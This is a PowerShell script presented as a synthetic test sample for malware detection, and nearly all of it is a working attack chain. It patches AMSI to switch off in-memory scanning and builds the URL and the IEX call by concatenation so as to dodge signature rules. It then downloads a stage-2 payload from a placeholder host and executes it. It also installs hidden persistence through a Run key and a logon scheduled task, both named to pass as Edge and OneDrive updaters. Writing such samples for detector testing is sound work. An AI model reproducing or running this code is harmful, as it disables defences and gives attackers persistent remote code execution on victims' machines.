# Synthetic test sample — combines downloader, AMSI bypass, persistence.
# Not in the training corpus (different shape: combines patterns + token order).
# Domains are RFC2606 placeholders. No actual malware code.

# 1. Patch AMSI to disable in-memory scanning.
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
    GetField('amsiInitFailed','NonPublic,Static').
    SetValue($null, $true)

# 2. Resolve loader URL by string-concat to bypass naive YARA rules.
$h = 'h' + 't' + 't' + 'p'
$d = 'staging.notreal.example'
$p = '/upd/'+(Get-Random -Maximum 9999)+'.txt'
$url = $h + '://' + $d + $p

# 3. Format-string "IEX" so the literal token does not appear.
$cmd = "{0}{1}{2}" -f 'I','E','X'

# 4. Pull stage-2 via WebClient and execute reflectively.
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
$payload = $wc.DownloadString($url)
&$cmd $payload

# 5. Persistence: Run-key.
$rk = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$ps = 'powershell -nop -w hidden -ep bypass -c "iex(iwr ' + $url + ')"'
New-ItemProperty -Path $rk -Name 'EdgeUpdaterSvc' -Value $ps -PropertyType String -Force | Out-Null

# 6. Backup persistence: scheduled task.
$action = New-ScheduledTaskAction -Execute 'powershell.exe' `
    -Argument '-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "iex(iwr ' + $url + ')"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName 'OneDriveSyncUpdater' -Action $action -Trigger $trigger `
    -RunLevel Highest -Force | Out-Null
